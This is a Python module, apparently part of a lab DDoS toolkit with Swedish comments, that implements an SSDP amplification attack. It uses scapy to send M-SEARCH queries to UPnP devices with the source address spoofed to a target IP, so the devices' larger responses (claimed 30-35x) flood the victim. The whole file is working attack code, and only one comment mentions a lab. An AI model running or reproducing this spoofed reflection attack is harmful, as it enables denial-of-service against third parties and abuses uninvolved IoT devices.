"""
SSDP Amplification Attack
Utnyttjar UPnP SSDP-protokollet för amplification
"""
from scapy.all import IP, UDP, Raw
import time
from .base_attack import BaseAttack
from utils.network_utils import generate_random_port


class SSDPAmplificationAttack(BaseAttack):
    """SSDP Amplification - Utnyttjar UPnP-enheter"""

    def get_attack_name(self):
        return "SSDP Amplification"

    def execute(self, count=100, ssdp_targets=None):
        """
        Kör SSDP amplification attack
        ssdp_targets: Lista med IP-adresser till UPnP-enheter
        """
        if ssdp_targets is None:
            # Exempel targets (använd egna IoT-enheter i labbet)
            ssdp_targets = [
                "192.168.1.150",  # Exempel: Smart TV
                "192.168.1.151",  # Exempel: Router
                "192.168.1.152"  # Exempel: Printer
            ]

        self.print_header("SSDP Amplification Attack", port=1900, count=count)

        print("[*] SSDP Amplification utnyttjar UPnP-enheter (IoT)")
        print(f"[*] Använder {len(ssdp_targets)} SSDP-enheter")
        print("[*] Förväntad amplifikation: 30-35x")

        self.start_time = time.time()
        self.packets_sent = 0

        # SSDP M-SEARCH request
        ssdp_request = f"""M-SEARCH * HTTP/1.1
Host: 239.255.255.250:1900
ST: ssdp:all
Man: "ssdp:discover"
MX: 3
User-Agent: {self.custom_message}

""".replace('\n', '\r\n').encode()

        for i in range(count):
            ssdp_target = ssdp_targets[i % len(ssdp_targets)]
            fake_sport = generate_random_port()

            # Source IP spoofad till target
            packet = IP(src=self.target_ip, dst=ssdp_target) / \
                     UDP(sport=fake_sport, dport=1900) / \
                     Raw(load=ssdp_request)

            self.send_packet(packet)

            if (i + 1) % 50 == 0:
                elapsed = time.time() - self.start_time
                pps = self.packets_sent / elapsed if elapsed > 0 else 0
                print(f"[+] SSDP Amp: {i + 1}/{count} M-SEARCH queries ({pps:.1f} pps)")
                print(f"    → UPnP-enheter svarar till {self.target_ip}")

        self.log_attack("SSDP_AMPLIFICATION",
                        f"{count} SSDP queries, target: {self.target_ip}, message: {self.custom_message}")
        self.print_summary()

        print("\n[!] Många IoT-enheter har UPnP aktiverat")
        print("[!] 120-byte query → 3000+ byte respons")

